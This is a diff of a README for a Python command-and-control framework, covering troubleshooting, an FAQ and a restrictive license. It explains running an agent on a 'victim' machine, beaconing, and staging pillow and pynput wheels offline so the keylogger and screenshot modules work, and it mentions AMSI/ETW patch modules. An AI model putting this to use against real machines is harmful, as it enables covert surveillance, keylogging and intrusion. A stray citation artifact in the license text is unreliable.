+### `[!] cert fingerprint mismatch`
 
-1. Confirm `server_public.pem` on the target matches the server's
-   `server_public.pem`. If the server regenerated its keys, both files
-   changed.
-2. Confirm the target can reach the chosen port
-   (`nc -zv <SERVER_IP> 8080`).
-3. Check the server's stdout — registration failures print to the console.
+The pin doesn't match. Either:
+- Copy-paste error — recopy from server banner
+- Server regenerated its cert (deleted `server.crt`/`server.key`) — recopy
+- MITM — verify network
 
-### `http 401` on beacon or result
+### `http 401` on beacon
 
-The `X-Agent-Id` header is missing or unknown. Ensure the agent's
-`agent_id` matches a row in the `agents` table:
+The `X-Agent-Token` is missing or wrong. The token is issued once at registration and rotated on reconnect. If this happens repeatedly:
+- The server may have been restarted (in-memory tokens lost)
+- The agent was re-registered as a new machine (new `machine_id`)
 
-```sql
-SELECT id, machine_id, hostname, connected FROM agents;
-```
+**Fix:** just wait — the agent reconnects and gets a fresh token.
 
-### HTTPS agent fails TLS verification
+### Agent offline in `list` but still running
 
-Add `--insecure` to the agent, or deploy a real certificate. The
-auto-generated `server.crt` is **not** signed by any CA.
+The `BEACON_TIMEOUT = 300` seconds watchdog marks agents dead after 5 minutes of no beacon. If your agent is slower than that (very high jitter), increase `BEACON_TIMEOUT` at the top of `server.py`.
 
-### Screenshot returns an error
+### `pip` not on victim, need screenshot/keylog
 
-- Linux: install `scrot` or ImageMagick (`import`)
-- Windows / macOS: `pip install pillow`
-- Headless Linux (no X/Wayland): will fail regardless — expected
-
-### AMSI/ETW modules return "[!] Windows only"
-
-Those patches only make sense on Windows and rely on `ctypes.windll`.
-Running them on Linux/macOS returns that message.
-
-### Keylogger says "pynput not installed"
-
+Those two modules need `pillow` and `pynput`. If the victim has no internet:
 ```bash
-pip install pynput
+# On attacker
+pip download -d ./wheels pillow pynput --platform win_amd64 --python-version 3.11 --only-binary=:all:
+
+# Copy wheels to victim, then
+pip install --no-index --find-links=./wheels pillow pynput
 ```
 
-On Linux, `pynput` also needs an X server. On headless servers, use a
-different `on_press` handler (e.g., log to file from the agent's own
-process).
+Or use the stdlib alternatives:
+- `screenshot` on Linux: `apt install scrot` → works without pillow
+- `keylog_start`: only via pynput (no stdlib alternative)
 
-### Agents show "dead" too quickly / too slowly
+### Server crash: `Address already in use`
 
-The watchdog marks agents offline after `BEACON_TIMEOUT = 300` seconds
-(5 minutes) without a beacon. Change this constant at the top of
-`server.py` if you need a different threshold. The agent-side beacon
-interval is `BEACON_INTERVAL = 5` seconds (with ±30% jitter) — change
-this at the top of `agent.py`.
-
-### Same target appears twice in `list`
-
-The `machine_id` hash is `sha256(hostname|mac|arch)`. If any of those
-change (VM cloned, NIC swapped, hostname renamed), the server treats it
-as a new agent. You can merge duplicates manually with SQL or accept
-it as expected behaviour for cloned VMs.
-
-### Looted file is truncated or corrupt
-
-Base64 payloads are carried in a single JSON blob. For very large files
-(hundreds of MB), the encrypted payloads get unwieldy. The framework
-works reliably up to a few MB; beyond that, chunk the download across
-multiple tasks.
+```
+sudo lsof -i :4444
+kill <PID>
+```
 
 ---
 
-## Extending the Framework
+## FAQ
 
-### Add a new post-exploitation module
+**Q: Does the victim need internet?**
+No. The agent has zero external dependencies. It only needs to reach the server over the local network.
 
-1. In `agent.py`, add a handler function:
+**Q: Does the victim need `pip install`?**
+No. The victim runs `python3 agent.py` with zero installs.
 
-   ```python
-   def _my_module(args):
-       return "result string"
-   ```
+**Q: Which file goes on the victim?**
+Just `agent.py`. That's it.
 
-2. Add a dispatch entry inside `execute_task()`:
+**Q: Which file goes on the attacker?**
+Everything except `agent.py` goes on the attacker. Copy `agent.py` from the attacker to the victim.
 
-   ```python
-   if cmd == "my_module": return _my_module(a)
-   ```
+**Q: Is the traffic encrypted?**
+Yes — TLS 1.2+ with AES-256-GCM. Equivalent to the encryption of any modern HTTPS website.
 
-3. In `server.py`, add it to the `process_command` whitelist:
+**Q: What happens if the server key is compromised?**
+If the attacker captured past traffic, TLS with perfect forward secrecy means past sessions stay encrypted. Future sessions are compromised.
 
-   ```python
-   if name in ("shell", ..., "my_module"):
-       ...
-   ```
+**Q: What if the victim doesn't have Python at all?**
+Then this framework won't work — you need a compiled binary. Options are Go/C agent, or PyInstaller bundling. Python 3.8+ is common on Linux/macOS; on Windows it's less common (but Python-based tools often work if the target has Python from some dev workflow).
 
-4. Add a `parse_line()` branch in `server.py` and `operator.py` so it
-   builds the right cmd dict (unless you only need the default
-   `{"cmd": "my_module"}` payload).
-
-### Add a new transport
-
-Subclass the pattern used by `HTTPTransport`:
-
-```python
-class MyTransport:
-    def connect(self): ...
-    def register(self, enc_payload) -> bytes: ...
-    def beacon(self, agent_id, enc_beacon) -> bytes: ...
-    def submit(self, agent_id, enc_result): ...
-```
-
-Then wire a corresponding server listener that decrypts the registration
-with `rsa_decrypt(core.priv, ...)`, calls `core.register_agent(...)`,
-and serves `core.beacon(aid)` / `core.submit_result(aid, ...)` the same
-way the existing listeners do.
-
-### Add a new operator role
-
-Edit the role checks in `C2Core.process_command()` and add the new role
-name to `add_operator`'s validation tuple:
-
-```python
-if r not in ("admin", "operator", "viewer", "auditor"):
-    return {"status": "error", "msg": "bad role"}
-```
-
-### Swap the database
-
-`DB` is a thin wrapper around `sqlite3`. To move to PostgreSQL or MySQL,
-replace its implementation — every call site uses `db.query()` and
-`db.execute()`, so the rest of the code does not change.
+**Q: Can I add a new module?**
+Yes. Add a handler function in `agent.py` `_execute_task()` dispatch, and a whitelist entry in `server.py` `process_command`. That's it.
 
 ---
 
 ## License
 
-This project is provided **for educational and authorized security
-testing purposes only**. No license is granted for use against systems
-you do not own or have explicit written permission to test.
+**This project is source-available, not open-source.**
 
-**Use at your own risk. You are responsible for your actions.**
+Copyright (c) 2026 [Your Name]. All rights reserved.
+
+This software is licensed under the **Polyform Strict License 1.0.0** (`LICENSE` file in this repository).
+
+### What you ARE permitted to do:
+- **View** the source code.
+- **Use** the software for **personal, non-commercial purposes** (research, private study, testing, hobby projects, educational use).
+
+### What you are expressly PROHIBITED from doing:
+- **Modifying**, altering, or creating derivative works based on this software.
+- **Distributing** or redistributing this software (or any portion of it) to any third party, in any form.
+
+### Important notes on the license:
+- **This license is free.** You do not need to purchase anything. The Polyform Project publishes it at no cost for anyone to use. [reference:0]
+- **This license makes your project "source-available," not "open-source."** Open-source licenses (MIT, Apache, GPL, etc.) all allow modification and redistribution. The Polyform Strict license does not.
+- **GitHub's platform features (like forking) operate under GitHub's Terms of Service, not your license.** While your license legally prohibits modification and redistribution, GitHub may still allow users to "fork" your repository on the platform. The license restricts what they can legally do with that fork.
+
+### Legal Notice
+This software is provided for authorized security testing and educational purposes only. You must have explicit, written permission from the owner of any system you test. Unauthorized use is illegal.
+
+---
+
+## Contact & Security
+
+If you discover a security issue in this project, please open an issue on this repository. Please do not use this tool against systems you do not own or have explicit permission to test.
+
+**Use at your own risk. You are solely responsible for your actions.**
